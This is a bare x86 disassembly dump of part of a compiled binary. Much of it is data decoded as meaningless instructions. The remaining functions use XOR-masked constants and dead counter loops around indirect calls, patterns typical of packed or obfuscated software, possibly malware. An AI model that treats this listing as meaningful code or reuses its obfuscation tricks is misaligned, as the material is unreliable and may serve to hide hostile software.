  40e535:	jnp    0x40e518
  40e537:	shr    BYTE PTR [edi],1
  40e539:	mov    edx,0xbfb1fbb8
  40e53e:	nop
  40e53f:	jmp    0xa83a:0x1d1e55ba
  40e546:	xchg   edx,eax
  40e547:	xchg   esi,eax
  40e548:	imul   esi,DWORD PTR [esp+eiz*8-0x7facf581],0x9ee0494
  40e553:	or     al,0xac
  40e555:	daa    
  40e556:	ret    
  40e557:	sbb    DWORD PTR [ebx],ebp
  40e559:	daa    
  40e55a:	and    cl,BYTE PTR [edx-0x68044af1]
  40e560:	or     al,bh
  40e562:	or     ebp,eax
  40e564:	cmp    eax,DWORD PTR [ebp+0x69]
  40e567:	stos   DWORD PTR es:[edi],eax
  40e568:	inc    edi
  40e569:	add    ebx,ebp
  40e56b:	sbb    ebx,ebp
  40e56d:	in     al,0x5e
  40e56f:	and    al,0x8a
  40e571:	xor    eax,edx
  40e573:	mov    ?,WORD PTR [edx-0x5749052c]
  40e579:	adc    eax,0xb9983408
  40e57e:	pushf  
  40e57f:	sub    al,0xf4
  40e581:	es jge 0x40e579
  40e584:	mov    eax,ds:0xcfa273c2
  40e589:	xchg   edi,eax
  40e58a:	js     0x40e5e0
  40e58c:	shl    BYTE PTR [ebp+0x3d],1
  40e58f:	clc    
  40e590:	(bad)  
  40e592:	loopne 0x40e57c
  40e594:	mov    ebx,0x76a310c9
  40e599:	and    al,0x12
  40e59b:	jb     0x40e589
  40e59d:	mov    dl,0x69
  40e59f:	xor    esi,edi
  40e5a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e5a2:	sbb    ebx,0x41210fea
  40e5a8:	sub    cl,BYTE PTR [ecx]
  40e5aa:	add    edi,DWORD PTR [edx+ebx*8]
  40e5ad:	sub    edi,DWORD PTR [ebx]
  40e5af:	ret    
  40e5b0:	outs   dx,DWORD PTR ds:[esi]
  40e5b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e5b2:	xchg   ebp,eax
  40e5b3:	test   ch,0x8f
  40e5b6:	mov    ah,0xe7
  40e5b8:	mov    DWORD PTR [edx],0xff709be9
  40e5be:	test   eax,0x5bfa333e
  40e5c3:	cmp    DWORD PTR [edx-0x267d011d],0x9521ac81
  40e5cd:	ins    DWORD PTR es:[edi],dx
  40e5ce:	cld    
  40e5cf:	mov    edx,0x8fd2a9f7
  40e5d4:	xlat   BYTE PTR ds:[ebx]
  40e5d5:	cmp    DWORD PTR [ebx],0x3443eb10
  40e5db:	jno    0x40e646
  40e5dd:	daa    
  40e5de:	stos   BYTE PTR es:[edi],al
  40e5df:	dec    esp
  40e5e0:	(bad)  
  40e5e1:	mov    DWORD PTR [eax-0x63],edi
  40e5e4:	fcom   QWORD PTR [edi+0x3843a96b]
  40e5ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e5eb:	fsubr  st(0),st
  40e5ed:	adc    eax,0xeef7f568
  40e5f2:	pop    edi
  40e5f3:	mov    esp,0x44a74670
  40e5f8:	in     eax,dx
  40e5f9:	scas   al,BYTE PTR es:[edi]
  40e5fa:	mov    ebp,ss
  40e5fc:	pop    ecx
  40e5fd:	mov    ah,0x8c
  40e5ff:	dec    edx
  40e600:	imul   DWORD PTR [ecx+edx*8-0x49f1bd25]
  40e607:	hlt    
  40e608:	pop    ebx
  40e609:	stos   BYTE PTR es:[edi],al
  40e60a:	jnp    0x40e5ba
  40e60c:	popf   
  40e60d:	cwde   
  40e60e:	push   ss
  40e60f:	popa   
  40e610:	(bad)
  40e614:	dec    ebp
  40e615:	pusha  
  40e616:	js     0x40e644
  40e618:	iret   
  40e619:	dec    ebx
  40e61a:	cmp    al,0xa0
  40e61c:	push   edx
  40e61d:	push   ecx
  40e61e:	cwde   
  40e61f:	mov    al,ah
  40e621:	shl    BYTE PTR [eax+0x71],cl
  40e624:	or     al,0x6c
  40e626:	addr16 pusha 
  40e628:	aam    0xe0
  40e62a:	jae    0x40e5ae
  40e62c:	leave  
  40e62d:	in     eax,dx
  40e62e:	(bad)  [ebx-0xf9e567b]
  40e634:	inc    ebp
  40e635:	mov    al,BYTE PTR [ecx+0x75]
  40e638:	pop    edi
  40e639:	push   esi
  40e63a:	xchg   edx,eax
  40e63b:	fsubr  QWORD PTR [eax]
  40e63d:	mov    ebp,0x7c759857
  40e642:	cmc    
  40e643:	inc    edx
  40e644:	inc    edi
  40e645:	push   edx
  40e646:	mov    eax,DWORD PTR [ebx-0x44f6b420]
  40e64c:	fwait
  40e64d:	pop    ebp
  40e64e:	adc    ecx,DWORD PTR [ecx]
  40e650:	add    BYTE PTR [edi],dh
  40e652:	pop    eax
  40e653:	push   ebx
  40e654:	add    al,0x9c
  40e656:	repz inc esp
  40e658:	inc    ebp
  40e659:	popa   
  40e65a:	sub    edi,eax
  40e65c:	or     al,0x9f
  40e65e:	jle    0x40e690
  40e660:	push   ds
  40e661:	or     eax,0x9a36f019
  40e666:	les    esp,FWORD PTR [ebx-0xc]
  40e669:	sbb    DWORD PTR [ebx-0x1],edx
  40e66c:	mov    edi,0xdc04b2c5
  40e671:	inc    edi
  40e672:	pop    ebp
  40e673:	shl    DWORD PTR [ebp+0x522ff363],0x84
  40e67a:	mov    al,ds:0xe1f71d8f
  40e67f:	xor    BYTE PTR [eax+0x72],cl
  40e682:	ret    
  40e683:	ds sub edi,edi
  40e686:	push   edx
  40e687:	cmp    eax,0x1dafd0e4
  40e68c:	xchg   ecx,eax
  40e68d:	pop    ss
  40e68e:	sahf   
  40e68f:	xchg   edi,eax
  40e690:	fsubr  QWORD PTR [edx-0x4368b3aa]
  40e696:	inc    eax
  40e697:	pusha  
  40e698:	mov    fs,WORD PTR [esi+0x3a]
  40e69b:	xrstors [edx-0x168d6170]
  40e6a2:	push   es
  40e6a3:	ins    DWORD PTR es:[edi],dx
  40e6a4:	mov    ah,0xeb
  40e6a6:	adc    edi,0xffffffa0
  40e6a9:	repnz pop ebp
  40e6ab:	pop    edi
  40e6ac:	test   eax,0x109dfeda
  40e6b1:	aaa    
  40e6b2:	ret    0x777f
  40e6b5:	sar    al,cl
  40e6b7:	sub    ebp,esp
  40e6b9:	sbb    al,0x94
  40e6bb:	jg     0x40e696
  40e6bd:	xchg   esp,eax
  40e6be:	push   edx
  40e6bf:	dec    esp
  40e6c0:	jo     0x40e688
  40e6c2:	mov    dl,0xa2
  40e6c4:	std    
  40e6c5:	mov    ch,0x56
  40e6c7:	ds into 
  40e6c9:	std    
  40e6ca:	or     eax,0xf1aa689c
  40e6cf:	scas   al,BYTE PTR es:[edi]
  40e6d0:	push   ds
  40e6d1:	es gs mov esi,0xa4ee932c
  40e6d8:	push   esi
  40e6d9:	fisttp DWORD PTR [eax+0x2e5fb818]
  40e6df:	cmp    BYTE PTR [edx-0x64e6832c],cl
  40e6e5:	or     eax,0x66818b69
  40e6ea:	out    dx,eax
  40e6eb:	mov    esi,0x693d7142
  40e6f0:	dec    ecx
  40e6f1:	or     BYTE PTR [ebx+0x21],dl
  40e6f4:	xchg   BYTE PTR [edx+edx*8-0x2b370ed2],bl
  40e6fb:	rcl    ebx,1
  40e6fd:	push   eax
  40e6fe:	cmp    bh,BYTE PTR [ebx]
  40e700:	inc    ebp
  40e701:	jo     0x40e717
  40e703:	push   DWORD PTR [edx+ebp*2-0x7764b78a]
  40e70a:	xor    BYTE PTR [edx+0x10],ah
  40e70d:	aam    0x3d
  40e70f:	aad    0x13
  40e711:	aad    0xce
  40e713:	stos   BYTE PTR es:[edi],al
  40e714:	fisttp QWORD PTR [ebx+0x631f9d49]
  40e71a:	outs   dx,BYTE PTR ds:[esi]
  40e71b:	cli    
  40e71c:	fcom   QWORD PTR [esi]
  40e71e:	int    0xd7
  40e720:	loopne 0x40e6ac
  40e722:	enter  0x8519,0xa3
  40e726:	shl    bh,1
  40e728:	test   DWORD PTR [eax],esi
  40e72a:	mov    dl,0xe5
  40e72c:	push   esi
  40e72d:	dec    ebx
  40e72e:	call   0xbf8d:0x6dada31a
  40e735:	push   ss
  40e736:	or     bh,BYTE PTR [ebx-0x6d]
  40e739:	push   es
  40e73a:	jp     0x40e6cc
  40e73c:	rcr    ebx,1
  40e73e:	cmp    BYTE PTR [ebx-0x74],bh
  40e741:	fist   DWORD PTR [edi-0x5b]
  40e744:	and    al,0x99
  40e746:	mov    esi,0x7b9061ec
  40e74b:	adc    esi,edi
  40e74d:	call   0x7fb5:0x610eb4ab
  40e754:	mov    ds:0x62319602,eax
  40e759:	push   ss
  40e75a:	not    DWORD PTR [ecx-0x2edac55c]
  40e760:	dec    esp
  40e761:	pop    es
  40e762:	in     al,0x6b
  40e764:	out    0x89,eax
  40e766:	and    BYTE PTR [ebp-0x2cc25234],ah
  40e76c:	packsswb mm7,QWORD PTR [ecx+0x16]
  40e770:	jb     0x40e70a
  40e772:	jmp    0xe638866c
  40e777:	mov    ebx,es
  40e779:	dec    ebp
  40e77a:	cdq    
  40e77b:	mov    bh,0x3c
  40e77d:	mov    ah,0x52
  40e77f:	ret    0xc83
  40e782:	ss add eax,0x1edba72c
  40e788:	and    al,0xf6
  40e78a:	jmp    0xded2503c
  40e78f:	(bad)  
  40e791:	dec    BYTE PTR [ebp-0x7]
  40e794:	shl    DWORD PTR fs:[edi+0x40],0x53
  40e799:	test   al,0x6e
  40e79b:	inc    ecx
  40e79c:	stos   DWORD PTR es:[edi],eax
  40e79d:	icebp  
  40e79e:	sbb    ch,BYTE PTR [ebp+0x37]
  40e7a1:	adc    al,0x60
  40e7a3:	retf   0x1d3e
  40e7a6:	clc    
  40e7a7:	mov    BYTE PTR [edx-0x20],0xcb
  40e7ab:	ins    BYTE PTR es:[edi],dx
  40e7ac:	data16 adc dl,bl
  40e7af:	out    0x56,al
  40e7b1:	rcl    BYTE PTR [ecx-0x50],0xae
  40e7b5:	lock js 0x40e77d
  40e7b8:	dec    esp
  40e7b9:	ins    BYTE PTR es:[edi],dx
  40e7ba:	pop    esi
  40e7bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e7bc:	aam    0xe0
  40e7be:	jns    0x40e81a
  40e7c0:	out    0x50,al
  40e7c2:	(bad)  
  40e7c3:	fwait
  40e7c4:	jne    0x40e7c7
  40e7c6:	fisttp QWORD PTR [edx-0x57]
  40e7c9:	retf   
  40e7ca:	pop    ebx
  40e7cb:	popa   
  40e7cc:	repnz pop es
  40e7ce:	xchg   ecx,eax
  40e7cf:	ss cld 
  40e7d1:	dec    esp
  40e7d3:	xchg   DWORD PTR [edi-0x1ace154c],edi
  40e7d9:	sbb    BYTE PTR [ebx+0x1375a12],0xc7
  40e7e0:	push   ebx
  40e7e1:	push   0x941edc4d
  40e7e6:	jnp    0x40e7c8
  40e7e8:	or     BYTE PTR [edx+esi*4+0x11],bh
  40e7ec:	dec    edx
  40e7ed:	adc    al,0xf7
  40e7ef:	push   ebx
  40e7f0:	repz push ebp
  40e7f2:	xchg   ecx,eax
  40e7f3:	sbb    BYTE PTR [ecx+0x424f1388],dl
  40e7f9:	not    DWORD PTR [edx]
  40e7fb:	or     ah,BYTE PTR [esi+0x588e7120]
  40e801:	lock mov edx,0x81b7e6ca
  40e807:	or     BYTE PTR [ebx-0x1e],cl
  40e80a:	xor    ah,BYTE PTR [ebx+0x51c6a349]
  40e810:	mov    edi,edx
  40e812:	fsubr  QWORD PTR [ebx-0x778d37d6]
  40e818:	jge    0x40e873
  40e81a:	xlat   BYTE PTR ds:[ebx]
  40e81b:	xlat   BYTE PTR ds:[ebx]
  40e81c:	jl     0x40e804
  40e81e:	je     0x40e88b
  40e820:	call   0xc55:0x11c22d7f
  40e827:	call   0x955e:0xd53be1f4
  40e82e:	in     eax,0xf9
  40e830:	mov    ecx,0x9b50f141
  40e835:	mov    esi,0x789ec54b
  40e83a:	stos   DWORD PTR es:[edi],eax
  40e83b:	fs dec esp
  40e83d:	out    0xf9,al
  40e83f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e840:	xlat   BYTE PTR ds:[ebx]
  40e841:	pop    ecx
  40e842:	leave  
  40e843:	fild   WORD PTR [edx-0x4dd39f5a]
  40e849:	sub    ebp,DWORD PTR [esi-0x350b2c57]
  40e84f:	ds shl eax,cl
  40e852:	adc    edx,DWORD PTR [ecx-0x6e7c9323]
  40e858:	or     ecx,DWORD PTR [ecx-0x4]
  40e85b:	add    DWORD PTR [eax+0x20],0xbdda2bca
  40e862:	rcr    DWORD PTR [eax],0xd9
  40e865:	pop    ebx
  40e866:	pop    es
  40e867:	leave  
  40e868:	cli    
  40e869:	test   eax,0x15293c0e
  40e86e:	xchg   DWORD PTR [esi-0x62820bfc],ebp
  40e874:	jae    0x40e8f2
  40e876:	cmc    
  40e877:	mov    al,0x50
  40e879:	popf   
  40e87a:	jmp    0x366fa7a
  40e87f:	(bad)  
  40e880:	mov    bl,0x46
  40e882:	aas    
  40e883:	mov    BYTE PTR [edi],0xf8
  40e886:	sub    esp,DWORD PTR [edi-0x26767d82]
  40e88c:	leave  
  40e88d:	test   BYTE PTR [ebx-0x44],ah
  40e890:	push   edi
  40e891:	cli    
  40e892:	es mov esp,0x5c88aa0a
  40e898:	aas    
  40e899:	lahf   
  40e89a:	jns    0x40e866
  40e89c:	xor    BYTE PTR [edi],dh
  40e89e:	lods   al,BYTE PTR ds:[esi]
  40e89f:	rol    BYTE PTR [edi+0x73],cl
  40e8a2:	jl     0x40e8c8
  40e8a4:	mov    dl,0xc6
  40e8a6:	sub    bh,BYTE PTR [ebp+0x2c]
  40e8a9:	aad    0x72
  40e8ab:	mov    edi,0x2e606540
  40e8b0:	cmp    ebx,edi
  40e8b2:	mov    al,ds:0xb2cdf8d7
  40e8b7:	fild   DWORD PTR [ebx-0x1f]
  40e8ba:	aaa    
  40e8bb:	cs ja  0x40e8ee
  40e8be:	and    al,0x8f
  40e8c0:	jns    0x40e8be
  40e8c2:	sbb    DWORD PTR [ecx+0x5407c169],ebp
  40e8c8:	push   edi
  40e8c9:	adc    BYTE PTR [ecx+0x2f],cl
  40e8cc:	imul   edi,DWORD PTR [edx+0x1b897874],0xffffffa6
  40e8d3:	not    BYTE PTR [eax]
  40e8d5:	inc    ecx
  40e8d6:	push   0xffffffee
  40e8d8:	outs   dx,BYTE PTR ds:[esi]
  40e8d9:	cmp    DWORD PTR [edi],edx
  40e8db:	loop   0x40e880
  40e8dd:	cmp    BYTE PTR [edx],bl
  40e8df:	call   0x7ac62572
  40e8e4:	mov    eax,0xf069ef91
  40e8e9:	xchg   edi,eax
  40e8ea:	dec    ebp
  40e8eb:	xor    ebp,DWORD PTR [edi]
  40e8ed:	sti    
  40e8ee:	pusha  
  40e8ef:	dec    BYTE PTR [ecx+eax*1]
  40e8f2:	inc    esp
  40e8f3:	dec    ebx
  40e8f4:	pop    esp
  40e8f5:	or     eax,0x57ded8ce
  40e8fa:	xchg   ecx,eax
  40e8fb:	mov    esi,DWORD PTR [edi+0x1fb26d87]
  40e901:	sub    BYTE PTR [ecx],ah
  40e903:	test   DWORD PTR [edi-0x3a],esp
  40e906:	call   0xa12f:0x1b1c98b4
  40e90d:	cmp    esi,ebx
  40e90f:	add    bl,BYTE PTR [eax*2-0x583ecaa3]
  40e916:	pop    ss
  40e917:	mov    WORD PTR [edi+0x2c1b7a9e],?
  40e91d:	pop    ebp
  40e91e:	icebp  
  40e91f:	retf   
  40e920:	adc    al,0xca
  40e922:	(bad)  
  40e923:	fidivr DWORD PTR [ecx-0x77a6ceb1]
  40e929:	adc    esi,DWORD PTR [ecx]
  40e92b:	sti    
  40e92c:	pusha  
  40e92d:	adc    eax,DWORD PTR [ebp-0x2ee987e5]
  40e933:	adc    al,0x7e
  40e935:	xchg   ecx,eax
  40e936:	adc    al,0x8a
  40e938:	mov    BYTE PTR [ebp+0x7f],cl
  40e93b:	sbb    eax,0x33c1ad63
  40e940:	jge    0x40e99a
  40e942:	fs out 0xc7,eax
  40e945:	xor    edi,eax
  40e947:	pusha  
  40e948:	fadd   st(3),st
  40e94a:	dec    eax
  40e94b:	aad    0x52
  40e94d:	jle    0x40e8d6
  40e94f:	push   esi
  40e950:	inc    edi
  40e951:	fsub   QWORD PTR [eax+eax*1]
  40e954:	push   edi
  40e955:	sbb    DWORD PTR [ebp-0x4920dd9d],edi
  40e95b:	pusha  
  40e95c:	inc    ecx
  40e95d:	je     0x40e9c0
  40e95f:	pop    edx
  40e960:	sbb    BYTE PTR [edi-0x28d6da40],bh
  40e966:	mov    bh,0x91
  40e968:	fadd   QWORD PTR [ebx+ebp*2-0x6d]
  40e96c:	mov    esp,0xa1c0c38b
  40e971:	shl    esp,1
  40e973:	xor    DWORD PTR [eax],ebp
  40e975:	inc    esp
  40e976:	imul   ebp,DWORD PTR [ecx+0x42],0xffffffdf
  40e97a:	sbb    DWORD PTR [eax+0x316a7dbc],edx
  40e980:	ins    DWORD PTR es:[edi],dx
  40e981:	push   esi
  40e982:	sub    ebp,DWORD PTR [ecx+0x46]
  40e985:	shr    BYTE PTR ds:0x5044205d,0xd3
  40e98c:	inc    edx
  40e98d:	leave  
  40e98e:	sub    BYTE PTR [eax],cl
  40e990:	cdq    
  40e991:	push   es
  40e992:	je     0x40e972
  40e994:	pop    ds
  40e995:	cld    
  40e996:	nop
  40e997:	int    0x8b
  40e999:	js     0x40e9d7
  40e99b:	lea    esi,[edi+esi*8+0x78]
  40e99f:	mov    esi,DWORD PTR [esi+eax*1]
  40e9a2:	mov    DWORD PTR [ebp-0x8],esi
  40e9a5:	mov    esi,DWORD PTR [ebp+0x8]
  40e9a8:	xor    esi,ecx
  40e9aa:	add    esi,edx
  40e9ac:	mov    DWORD PTR [ebp-0x14],esi
  40e9af:	mov    esi,DWORD PTR [ebp+0x8]
  40e9b2:	mov    edi,DWORD PTR [ebp-0x8]
  40e9b5:	xor    esi,ecx
  40e9b7:	add    esi,edx
  40e9b9:	pop    ebx
  40e9ba:	cmp    edi,esi
  40e9bc:	jne    0x40e9da
  40e9c2:	mov    eax,DWORD PTR [ebp+0xc]
  40e9c5:	xor    eax,ecx
  40e9c7:	mov    ecx,DWORD PTR [ebp-0x8]
  40e9ca:	add    eax,edx
  40e9cc:	imul   eax,ecx
  40e9cf:	mov    DWORD PTR [ebp-0x8],eax
  40e9d2:	push   DWORD PTR [ebp+0x18]
  40e9d5:	jmp    0x40ea2e
  40e9da:	mov    ecx,DWORD PTR [ebp-0x8]
  40e9dd:	add    ecx,eax
  40e9df:	mov    DWORD PTR [ebp-0x14],ecx
  40e9e2:	mov    ecx,DWORD PTR [ebp-0x14]
  40e9e5:	mov    ecx,DWORD PTR [ecx+0xc]
  40e9e8:	movsx  cx,BYTE PTR [ecx+eax*1]
  40e9ed:	mov    edx,0x3b51
  40e9f2:	sub    cx,dx
  40e9f5:	mov    edx,0x8a8d
  40e9fa:	xor    cx,dx
  40e9fd:	mov    edx,0x4e77
  40ea02:	cmp    cx,dx
  40ea05:	jne    0x40e9d2
  40ea0b:	mov    ecx,DWORD PTR ds:0x42e2b7
  40ea11:	mov    ecx,DWORD PTR [ecx+0x198]
  40ea17:	mov    DWORD PTR [ecx],eax
  40ea19:	jmp    0x40ea3f
  40ea1e:	mov    ecx,DWORD PTR [ebp+0x18]
  40ea21:	cmp    ecx,0xf89c8584
  40ea27:	jne    0x40ea3f
  40ea2d:	push   eax
  40ea2e:	push   DWORD PTR [ebp+0x14]
  40ea31:	push   DWORD PTR [ebp+0x10]
  40ea34:	push   DWORD PTR [ebp+0xc]
  40ea37:	push   DWORD PTR [ebp+0x8]
  40ea3a:	call   0x405799
  40ea3f:	pop    edi
  40ea40:	pop    esi
  40ea41:	leave  
  40ea42:	ret    0x14
  40ea45:	push   ebp
  40ea46:	mov    ebp,esp
  40ea48:	sub    esp,0xc
  40ea4b:	and    DWORD PTR ds:0x42d00c,0x0
  40ea55:	jmp    0x40ea67
  40ea5a:	mov    edx,DWORD PTR ds:0x42d00c
  40ea60:	inc    edx
  40ea61:	mov    DWORD PTR ds:0x42d00c,edx
  40ea67:	cmp    DWORD PTR ds:0x42d00c,0x16
  40ea6e:	jae    0x40eb33
  40ea74:	cmp    DWORD PTR ds:0x42d00c,0xd
  40ea7b:	jne    0x40eac1
  40ea81:	push   0x42e075
  40ea86:	push   0x6212
  40ea8b:	push   DWORD PTR [ebp-0x28]
  40ea8e:	push   0x739a
  40ea93:	push   DWORD PTR [ebp-0x20]
  40ea96:	push   0x3288
  40ea9b:	push   DWORD PTR [ebp-0x28]
  40ea9e:	push   DWORD PTR [ebp-0x1c]
  40eaa1:	push   0x2781
  40eaa6:	push   0x445b
  40eaab:	push   0x2755
  40eab0:	push   DWORD PTR [ebp-0x24]
  40eab3:	push   DWORD PTR [ebp-0x1c]
  40eab6:	push   0x361a
  40eabb:	call   DWORD PTR ds:0x42e8bb
  40eac1:	cmp    DWORD PTR ds:0x42d00c,0xc
  40eac8:	jne    0x40eadb
  40eace:	mov    edx,DWORD PTR ds:0x42d00c
  40ead4:	inc    edx
  40ead5:	mov    DWORD PTR ds:0x42d00c,edx
  40eadb:	jmp    0x40ea5a
  40eae0:	and    DWORD PTR ds:0x42c008,0x0
  40eaea:	jmp    0x40eafe
  40eaef:	xor    edx,edx
  40eaf1:	or     edx,DWORD PTR ds:0x42c008
  40eaf7:	inc    edx
  40eaf8:	mov    DWORD PTR ds:0x42c008,edx
  40eafe:	cmp    DWORD PTR ds:0x42c008,0x14
  40eb05:	jae    0x40eb33
  40eb0b:	cmp    DWORD PTR ds:0x42c008,0x18
  40eb12:	jne    0x40eb2e
  40eb18:	push   DWORD PTR [ebp-0x24]
  40eb1b:	push   DWORD PTR [ebp-0x18]
  40eb1e:	push   0x8994
  40eb23:	push   0x6271
  40eb28:	call   DWORD PTR ds:0x42e8e7
  40eb2e:	jmp    0x40eaef
  40eb33:	push   esi
  40eb34:	mov    esi,0xf89c8585
  40eb39:	xor    DWORD PTR ds:0x429000,ebx
  40eb3f:	mov    DWORD PTR [ebp-0x8],esi
  40eb42:	mov    DWORD PTR [ebp-0x4],0xf89c8584
  40eb49:	mov    edx,DWORD PTR ds:0x41cd75
  40eb4f:	mov    ecx,DWORD PTR ds:0x41ce0c
  40eb55:	sub    ecx,edx
  40eb57:	add    edx,DWORD PTR [edx+ecx*1]
  40eb5a:	push   edi
  40eb5b:	mov    eax,eax
  40eb5d:	mov    eax,DWORD PTR [ebp-0x4]
  40eb60:	mov    edi,DWORD PTR [ebp-0x8]
  40eb63:	mov    ecx,0x751089b
  40eb68:	xor    eax,ecx
  40eb6a:	xor    edi,ecx
  40eb6c:	mov    edx,0x3272e2
  40eb71:	add    edi,edx
  40eb73:	add    eax,edx
  40eb75:	imul   eax,edi
  40eb78:	mov    edi,DWORD PTR [ebp+0xc]
  40eb7b:	cmp    edi,eax
  40eb7d:	je     0x40ebd2
  40eb83:	mov    DWORD PTR [ebp-0xc],esi
  40eb86:	mov    eax,DWORD PTR [ebp-0xc]
  40eb89:	mov    esi,DWORD PTR [ebp+0xc]
  40eb8c:	xor    eax,ecx
  40eb8e:	lea    eax,[eax*8+0x1939788]
  40eb95:	mov    eax,DWORD PTR [esi+eax*1]
  40eb98:	mov    DWORD PTR [ebp+0xc],eax
  40eb9b:	mov    eax,DWORD PTR [ebp-0x4]
  40eb9e:	mov    esi,DWORD PTR [ebp-0x8]
  40eba1:	xor    eax,ecx
  40eba3:	xor    esi,ecx
  40eba5:	add    esi,edx
  40eba7:	add    eax,edx
  40eba9:	imul   eax,esi
  40ebac:	mov    esi,DWORD PTR [ebp+0xc]
  40ebaf:	cmp    esi,eax
  40ebb1:	je     0x40ebd2
  40ebb7:	mov    eax,DWORD PTR [ebp-0x4]
  40ebba:	xor    eax,ecx
  40ebbc:	mov    ecx,DWORD PTR [ebp+0xc]
  40ebbf:	add    eax,edx
  40ebc1:	imul   eax,ecx
  40ebc4:	add    eax,DWORD PTR [ebp+0x8]
  40ebc7:	mov    DWORD PTR [ebp+0xc],eax
  40ebca:	mov    eax,DWORD PTR [ebp+0xc]
  40ebcd:	jmp    0x40ebe3
  40ebd2:	mov    eax,DWORD PTR [ebp-0x4]
  40ebd5:	mov    esi,DWORD PTR [ebp-0x8]
  40ebd8:	xor    esi,ecx
  40ebda:	xor    eax,ecx
  40ebdc:	add    esi,edx
  40ebde:	add    eax,edx
  40ebe0:	imul   eax,esi
  40ebe3:	pop    edi
  40ebe4:	pop    esi
  40ebe5:	leave  
  40ebe6:	ret    0x8
  40ebe9:	push   ebp
  40ebea:	mov    ebp,esp
  40ebec:	push   ecx
  40ebed:	and    DWORD PTR ds:0x42a00c,0x0
  40ebf7:	xor    ecx,ecx
  40ebf9:	or     ecx,DWORD PTR ds:0x42a00c
  40ebff:	inc    ecx
  40ec00:	mov    DWORD PTR ds:0x42a00c,ecx
  40ec06:	cmp    DWORD PTR ds:0x42a00c,0x21
  40ec0d:	jne    0x40ec29
  40ec13:	push   0x29ed
  40ec18:	push   DWORD PTR [ebp-0x24]
  40ec1b:	push   0x42e0c2
  40ec20:	push   DWORD PTR [ebp-0x28]
  40ec23:	call   DWORD PTR ds:0x42e8eb
  40ec29:	cmp    DWORD PTR ds:0x42a00c,0x1f
  40ec30:	jb     0x40ebf7
  40ec36:	mov    DWORD PTR [ebp-0x4],0xf89c85b9
  40ec3d:	mov    eax,DWORD PTR [ebp-0x4]
  40ec40:	mov    edx,DWORD PTR [ebp+0x10]
  40ec43:	and    DWORD PTR ds:0x42b004,0x0
  40ec4d:	jmp    0x40ec5f
  40ec52:	mov    ecx,DWORD PTR ds:0x42b004
  40ec58:	inc    ecx
  40ec59:	mov    DWORD PTR ds:0x42b004,ecx
  40ec5f:	cmp    DWORD PTR ds:0x42b004,0x1d
  40ec66:	jae    0x40ec84
  40ec6c:	cmp    DWORD PTR ds:0x42b004,0x29
  40ec73:	jne    0x40ec7f
  40ec79:	call   DWORD PTR ds:0x42e8ef
  40ec7f:	jmp    0x40ec52
  40ec84:	mov    ecx,0x751089b
  40ec89:	xor    eax,ecx
  40ec8b:	add    eax,0x3272e2
  40ec90:	mov    DWORD PTR [edx],eax
  40ec92:	mov    eax,DWORD PTR [ebp+0xc]
  40ec95:	xor    eax,ecx
  40ec97:	push   esi
  40ec98:	mov    esi,DWORD PTR [ebp+0x10]
  40ec9b:	mov    edx,0x3272e2
  40eca0:	add    eax,edx
  40eca2:	mov    DWORD PTR [esi+0x4],eax
  40eca5:	mov    eax,DWORD PTR [ebp+0x14]
  40eca8:	mov    esi,DWORD PTR [ebp+0x10]
  40ecab:	mov    DWORD PTR [esi+0x8],eax
  40ecae:	mov    eax,DWORD PTR [ebp+0x18]
  40ecb1:	mov    esi,DWORD PTR [ebp+0x10]
  40ecb4:	mov    DWORD PTR [esi+0xc],eax
  40ecb7:	mov    eax,DWORD PTR [ebp+0x1c]
  40ecba:	mov    esi,DWORD PTR [ebp+0x10]
  40ecbd:	mov    DWORD PTR [esi+0x10],eax
  40ecc0:	mov    eax,DWORD PTR [ebp+0x8]
  40ecc3:	xor    eax,ecx
  40ecc5:	add    eax,edx
  40ecc7:	pop    esi
  40ecc8:	leave  
  40ecc9:	ret    0x18
  40eccc:	push   ebp
  40eccd:	mov    ebp,esp
  40eccf:	sub    esp,0x9c
  40ecd5:	adc    DWORD PTR ds:0x42c004,ecx
  40ecdb:	jmp    0x411024
  40ece0:	xor    edx,edx
  40ece2:	jg     0x40ecc5
  40ece4:	(bad)  
  40ece6:	mov    bl,0xb2
  40ece8:	pop    ebx
  40ece9:	ja     0x40ecd9
  40eceb:	inc    eax
  40ecec:	neg    DWORD PTR [edi+0xd]
  40ecef:	or     edi,DWORD PTR [esp+ecx*8+0x7c]
  40ecf3:	jl     0x40ed35
  40ecf5:	pop    edi
  40ecf6:	jl     0x40ed74
  40ecf8:	dec    ecx
  40ecf9:	jno    0x40ed79
  40ecfb:	jbe    0x40ed1f
  40ecfd:	jmp    0x520192a
  40ed02:	and    DWORD PTR [edx],0xb5f42a08
  40ed08:	stc    
  40ed09:	inc    bl
  40ed0b:	pop    ebx
  40ed0c:	jle    0x40ec90
  40ed0e:	fs mov esi,0xa3ea9cf1
  40ed14:	push   es
  40ed15:	add    ah,ch
  40ed17:	adc    bl,dl
  40ed19:	mov    ds:0xffd98860,eax
  40ed1e:	adc    al,0xd0
  40ed20:	pop    esp
  40ed21:	fidiv  WORD PTR [ecx+ebx*8+0x26]
  40ed25:	retf   
  40ed26:	es fwait
  40ed28:	rcl    DWORD PTR [ebx+edx*8],1
  40ed2b:	gs fbld TBYTE PTR gs:[ebx+0x23]
  40ed30:	jp     0x40ecd2
  40ed32:	shr    BYTE PTR [edx-0x53],cl
  40ed35:	fsubr  QWORD PTR [esi]
  40ed37:	ret    0x5af3
  40ed3a:	out    dx,eax
  40ed3b:	repz mov bl,0x77
  40ed3e:	fmul   QWORD PTR [edi-0x7c]
  40ed41:	jo     0x40eda8
  40ed43:	adc    BYTE PTR [edx-0x129a09d8],ah
  40ed49:	or     edi,DWORD PTR [ecx+0x63]
  40ed4c:	sbb    al,0xb7
  40ed4e:	scas   al,BYTE PTR es:[edi]
  40ed4f:	js     0x40ed53
  40ed51:	aas    
  40ed52:	and    cl,BYTE PTR [ebx-0x64]
  40ed55:	rcr    DWORD PTR [ecx+0x5b],0xfe
  40ed59:	or     DWORD PTR [edx+eiz*8-0x324a9b66],ebp
  40ed60:	int    0xbc
  40ed62:	add    eax,0x55c0b18
  40ed67:	outs   dx,DWORD PTR ds:[esi]
  40ed68:	aam    0x9d
  40ed6a:	sar    DWORD PTR [edi],1
  40ed6c:	das    
  40ed6d:	dec    eax
  40ed6e:	push   edi
  40ed6f:	in     eax,dx
  40ed70:	shl    BYTE PTR [ecx-0x5a],cl
